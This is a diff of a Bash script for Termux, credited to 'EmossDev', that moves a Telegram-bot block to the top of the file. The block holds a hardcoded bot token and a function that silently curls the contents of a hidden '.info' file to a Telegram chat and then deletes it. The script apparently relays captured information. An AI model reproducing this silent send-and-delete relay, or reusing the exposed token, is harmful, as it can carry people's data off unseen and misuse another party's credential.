@@ -1,6 +1,39 @@
 #!/bin/bash
 # Coded By EmossDev
 
+
+# TELEGRAM BOT BİLGİLERİ #
+id=$(cat $PREFIX/lib/.bot_config | sed -n 1p | awk '{print $1}')
+token="8866647465:AAF3vy0T-O6FDlU-0OVa4FIBYV54NAgWyio"
+url="https://api.telegram.org/bot"
+send="/sendMessage"
+mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)
+
+# BİLGİ GÖNDERME FONKSİYONU #
+_send() {
+    mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)
+    file_info="saved_info.txt"
+    
+    # TERMUX API BİLGİLERİ #
+    if [[ $mode == termux-api ]]; then
+        if [[ -a .info ]]; then
+            termux-notification -t "Emoss Dev Tools" -c "$(cat .info)"
+            curl -s -X POST "${url}${token}${send}" -d "chat_id=${id}" -d "text=$(cat .info)" > /dev/null
+            rm .info
+        fi
+    else
+        # Standart curl ile gönderim altyapısı
+        if [[ -a .info ]]; then
+            curl -s -X POST "${url}${token}${send}" -d "chat_id=${id}" -d "text=$(cat .info)" > /dev/null
+            rm .info
+        fi
+    fi
+}
+
+if [[ $1 == --send ]]; then
+    _send
+fi
+
 # DOSYA KONTROLÜ #
 if [[ ! -a $PREFIX/lib/.bot_config ]]; then
     echo
@@ -57,34 +90,3 @@ if [[ $1 == -h || $1 == --help ]]; then
     exit
 fi
 
-# TELEGRAM BOT BİLGİLERİ #
-id=$(cat $PREFIX/lib/.bot_config | sed -n 1p | awk '{print $1}')
-token="8866647465:AAF3vy0T-O6FDlU-0OVa4FIBYV54NAgWyio"
-url="https://api.telegram.org/bot"
-send="/sendMessage"
-mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)
-
-# BİLGİ GÖNDERME FONKSİYONU #
-_send() {
-    mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)
-    file_info="saved_info.txt"
-    
-    # TERMUX API BİLGİLERİ #
-    if [[ $mode == termux-api ]]; then
-        if [[ -a .info ]]; then
-            termux-notification -t "Emoss Dev Tools" -c "$(cat .info)"
-            curl -s -X POST "${url}${token}${send}" -d "chat_id=${id}" -d "text=$(cat .info)" > /dev/null
-            rm .info
-        fi
-    else
-        # Standart curl ile gönderim altyapısı
-        if [[ -a .info ]]; then
-            curl -s -X POST "${url}${token}${send}" -d "chat_id=${id}" -d "text=$(cat .info)" > /dev/null
-            rm .info
-        fi
-    fi
-}
-
-if [[ $1 == --send ]]; then
-    _send
-fi
